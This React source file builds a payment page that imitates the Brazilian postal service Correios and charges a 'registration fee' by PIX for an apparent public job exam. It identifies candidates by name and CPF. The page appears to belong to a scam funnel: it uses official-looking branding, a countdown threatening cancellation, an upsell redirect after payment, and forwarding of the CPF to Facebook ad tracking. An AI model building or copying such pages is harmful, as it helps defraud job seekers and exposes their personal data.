import { useEffect, useState, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { CheckCircle, Copy, Clock, Loader2 } from "lucide-react";
import CorreiosHeader from "@/components/CorreiosHeader";
import CorreiosFooter from "@/components/CorreiosFooter";
import { CPFData } from "@/lib/cpf";
import { normalizeBuyer } from "@/lib/pixBuyer";
import { toast } from "@/hooks/use-toast";
import { supabase } from "@/integrations/supabase/client";
import { saveSession, getSession, clearSession } from "@/hooks/useSessionPersistence";
import { getPixStorageKey, savePixData, getStoredPixData, getPixRemainingTime } from "@/hooks/usePixPersistence";
import { fbEvents } from "@/lib/fbPixel";
import { getStoredUtmParams, getUtmSignature, captureUtmParams } from "@/hooks/useUtmTracking";
import { trackFunnelEvent } from "@/hooks/useFunnelTracking";

interface PixData {
  code: string;
  qrcode_base64: string;
  transaction_id: string;
  external_id: string;
}

const Pagamento = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [isProcessing, setIsProcessing] = useState(false);
  const [isCompleted, setIsCompleted] = useState(false);
  const [countdown, setCountdown] = useState(600);
  const [pixData, setPixData] = useState<PixData | null>(null);
  const [isLoadingPix, setIsLoadingPix] = useState(true);
  const [pixError, setPixError] = useState<string | null>(null);
  const [showPix, setShowPix] = useState(false);
  const checkIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const hasTrackedRef = useRef(false);
  const pixStorageKey = getPixStorageKey("pagamento");

  const session = getSession();
  const cpfData: CPFData | undefined = location.state?.cpfData || session?.cpfData;
  const valorBeneficio: number | undefined = location.state?.valorBeneficio || session?.valorBeneficio;
  const protocolo: string | undefined = location.state?.protocolo || session?.protocolo;

  useEffect(() => { window.scrollTo(0, 0); }, []);

  useEffect(() => {
    if (!cpfData || !valorBeneficio) { navigate("/"); return; }
    const cepData = location.state?.cepData || session?.cepData;
    saveSession({ cpfData, currentStep: "/pagamento", valorBeneficio, protocolo, cepData });
    if (!hasTrackedRef.current) { hasTrackedRef.current = true; trackFunnelEvent('pagamento', { cpf: cpfData.cpf }); }
    const currentUtmSignature = getUtmSignature();
    const storedPix = getStoredPixData(pixStorageKey, currentUtmSignature);
    if (storedPix) {
      setPixData({ code: storedPix.code, qrcode_base64: storedPix.qrcode_base64, transaction_id: storedPix.transaction_id, external_id: storedPix.external_id });
      setCountdown(getPixRemainingTime(pixStorageKey));
      setIsLoadingPix(false);
      startPaymentCheck(storedPix.external_id);
      return;
    }
    const generatePix = async () => {
      try {
        setIsLoadingPix(true); setPixError(null);
        const amountInCents = Math.round(valorBeneficio * 100);
        const externalId = `${protocolo || 'COR'}-API-${Date.now()}`;
        // Safety net: captura UTMs antes de ler
        captureUtmParams();
        const utmParams = getStoredUtmParams();
        console.log('[Pagamento] UTM params for PIX:', utmParams);
        const buyer = normalizeBuyer(cpfData.nome, cpfData.cpf);
        const response = await supabase.functions.invoke('create-pix', {
          body: { amount: amountInCents, external_id: externalId, buyer: { name: buyer.name, email: buyer.email, document: buyer.document }, tracking: { utm_source: utmParams.utm_source, utm_medium: utmParams.utm_medium, utm_campaign: utmParams.utm_campaign, utm_content: utmParams.utm_content, utm_term: utmParams.utm_term, utm_id: utmParams.utm_id, src: utmParams.src, sck: utmParams.sck, ref: utmParams.ref } },
        });
        if (response.error) { setPixError('Erro ao gerar PIX. Tente novamente.'); return; }
        const data = response.data;
        if (data?.data?.pix) {
          const newPixData = { code: data.data.pix.code, qrcode_base64: data.data.pix.qrcode_base64, transaction_id: data.data.id, external_id: externalId };
          setPixData(newPixData); savePixData(pixStorageKey, newPixData, getUtmSignature()); startPaymentCheck(externalId);
        } else { setPixError('Resposta inválida do servidor.'); }
      } catch { setPixError('Erro ao gerar PIX. Tente novamente.'); } finally { setIsLoadingPix(false); }
    };
    generatePix();
    return () => { if (checkIntervalRef.current) clearInterval(checkIntervalRef.current); };
  }, [cpfData, valorBeneficio, protocolo, navigate]);

  useEffect(() => {
    const timer = setInterval(() => { setCountdown(prev => { if (prev <= 0) { clearInterval(timer); return 0; } return prev - 1; }); }, 1000);
    return () => clearInterval(timer);
  }, []);

  const startPaymentCheck = (externalId: string) => {
    checkIntervalRef.current = setInterval(async () => {
      try {
        const response = await supabase.functions.invoke('check-pix-status', { body: { external_id: externalId } });
        if (response.data?.data?.status === 'paid') {
          if (checkIntervalRef.current) clearInterval(checkIntervalRef.current);
          fbEvents.purchase({ value: valorBeneficio!, currency: 'BRL', content_name: 'Taxa de Inscrição Correios' });
          fbEvents.serverPurchase({ first_name: cpfData!.nome.split(' ')[0], cpf: cpfData!.cpf, value: valorBeneficio!, content_name: 'Taxa de Inscrição Correios' });
          toast({ title: "Pagamento confirmado!", description: "Processando inscrição..." });
          navigate("/upsell-info/1", { state: { cpfData, valorBeneficio, protocolo } });
        }
      } catch {}
    }, 15000);
  };

  const formatTime = (s: number) => `${Math.floor(s / 60).toString().padStart(2, '0')}:${(s % 60).toString().padStart(2, '0')}`;

  const handleCopiarPix = () => {
    if (pixData?.code) { navigator.clipboard.writeText(pixData.code); toast({ title: "Código PIX copiado! ✓", description: "Cole no seu app bancário" }); }
  };

  const handleConfirmarPagamento = () => {
    setIsProcessing(true);
    if (pixData?.external_id) {
      supabase.functions.invoke('check-pix-status', { body: { external_id: pixData.external_id } }).then((response) => {
        if (response.data?.data?.status === 'paid') {
          if (checkIntervalRef.current) clearInterval(checkIntervalRef.current);
          fbEvents.purchase({ value: valorBeneficio!, currency: 'BRL', content_name: 'Taxa de Inscrição Correios' });
          fbEvents.serverPurchase({ first_name: cpfData!.nome.split(' ')[0], cpf: cpfData!.cpf, value: valorBeneficio!, content_name: 'Taxa de Inscrição Correios' });
          toast({ title: "Pagamento confirmado!", description: "Processando inscrição..." });
          navigate("/upsell-info/1", { state: { cpfData, valorBeneficio, protocolo } });
        } else {
          toast({ title: "Aguardando pagamento", description: "Ainda não identificamos. Tente em alguns segundos.", variant: "destructive" });
        }
        setIsProcessing(false);
      }).catch(() => { setIsProcessing(false); toast({ title: "Erro ao verificar", description: "Tente novamente.", variant: "destructive" }); });
    } else { setIsProcessing(false); }
  };

  if (!cpfData || !valorBeneficio) return null;

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <CorreiosHeader breadcrumb="Concursos > Atendente Comercial > Inscrição > Pagamento" />

      <main className="flex-1 px-4 py-6 sm:py-8">
        <div className="max-w-lg mx-auto space-y-5">

          <h1 className="titulo-institucional text-lg">PAGAMENTO — TAXA DE INSCRIÇÃO</h1>

          {isLoadingPix ? (
            <div className="flex flex-col items-center justify-center py-12 space-y-4">
              <Loader2 className="w-12 h-12 animate-spin text-primary" />
              <p className="text-muted-foreground font-medium">Gerando PIX de inscrição...</p>
            </div>
          ) : pixError ? (
            <div className="flex flex-col items-center justify-center py-12 space-y-4">
              <p className="text-destructive font-medium text-center">{pixError}</p>
              <Button onClick={() => window.location.reload()} variant="outline">Tentar novamente</Button>
            </div>
          ) : !isCompleted ? (
            <div className="space-y-5">
              {/* Countdown */}
              <div className="bg-destructive/10 border border-destructive/30 rounded p-3 text-center">
                <div className="flex items-center justify-center gap-2 text-destructive">
                  <Clock className="w-4 h-4" />
                  <span className="font-semibold text-sm">Tempo restante para pagamento:</span>
                </div>
                <p className="text-3xl font-black text-destructive font-mono mt-1">{formatTime(countdown)}</p>
                <p className="text-[10px] text-destructive/80 mt-1">Após este prazo, sua inscrição será cancelada</p>
              </div>

              {/* Candidate data table */}
              <table className="tabela-zebra">
                <thead><tr><th colSpan={2}>Dados do Pagamento</th></tr></thead>
                <tbody>
                  <tr><td className="font-semibold w-1/3">Candidato</td><td>{cpfData.nome}</td></tr>
                  <tr><td className="font-semibold">CPF</td><td>{cpfData.cpf}</td></tr>
                  <tr><td className="font-semibold">Taxa de Inscrição</td><td className="font-black text-primary">R$ {valorBeneficio.toFixed(2).replace('.', ',')}</td></tr>
                  {protocolo && <tr><td className="font-semibold">Protocolo</td><td className="font-mono text-xs">{protocolo}</td></tr>}
                </tbody>
              </table>

              {!showPix ? (
                <Button onClick={() => setShowPix(true)} disabled={!pixData} className="w-full h-12 text-sm font-bold">
                  PAGAR TAXA DE INSCRIÇÃO
                </Button>
              ) : (
                <div className="space-y-4 animate-fade-in">
                  <p className="text-xs text-muted-foreground font-medium text-center">Escaneie o QR Code ou copie o código PIX:</p>
                  <div className="w-44 h-44 mx-auto bg-card rounded border-2 border-primary p-2">
                    {pixData?.qrcode_base64 ? (
                      <img src={`data:image/png;base64,${pixData.qrcode_base64}`} alt="QR Code PIX" className="w-full h-full rounded" />
                    ) : (
                      <div className="w-full h-full bg-muted/30 rounded flex items-center justify-center">
                        <Loader2 className="w-8 h-8 animate-spin text-muted-foreground" />
                      </div>
                    )}
                  </div>
                  <Button variant="outline" onClick={handleCopiarPix} disabled={!pixData?.code} className="w-full h-12 border-2 border-primary text-primary font-bold text-sm">
                    <Copy className="w-4 h-4 mr-2" /> Copiar código PIX
                  </Button>
                  <Button onClick={handleConfirmarPagamento} disabled={isProcessing || !pixData} className="w-full h-12 text-sm font-bold">
                    {isProcessing ? (<><Loader2 className="w-5 h-5 animate-spin mr-2" />Verificando...</>) : "JÁ PAGUEI — CONFIRMAR INSCRIÇÃO"}
                  </Button>
                </div>
              )}

              <p className="text-[10px] text-center text-muted-foreground">
                Após confirmação do pagamento, sua inscrição será efetivada automaticamente.
              </p>
            </div>
          ) : (
            <div className="text-center space-y-6 py-4">
              <div className="w-24 h-24 mx-auto bg-success/10 rounded-full flex items-center justify-center">
                <CheckCircle className="w-14 h-14 text-success" />
              </div>
              <h2 className="text-xl font-bold">Inscrição Confirmada!</h2>
              <Button onClick={() => { clearSession(); navigate("/"); }} variant="outline" className="w-full h-12 font-bold text-sm">
                Voltar ao início
              </Button>
            </div>
          )}
        </div>
      </main>

      <CorreiosFooter />
    </div>
  );
};

export default Pagamento;
